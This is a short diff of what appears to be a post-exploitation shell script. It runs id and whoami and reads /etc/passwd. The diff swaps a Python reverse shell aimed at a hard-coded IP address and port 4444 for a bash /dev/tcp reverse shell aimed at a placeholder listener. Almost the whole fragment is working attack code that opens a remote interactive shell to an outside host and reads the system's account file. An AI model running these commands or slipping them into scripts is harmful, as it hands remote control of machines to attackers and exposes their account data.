@@ -8,7 +8,7 @@ set -o pipefail
 id
 whoami
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("71.47.217.216",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1
 
 cat /etc/passwd
 
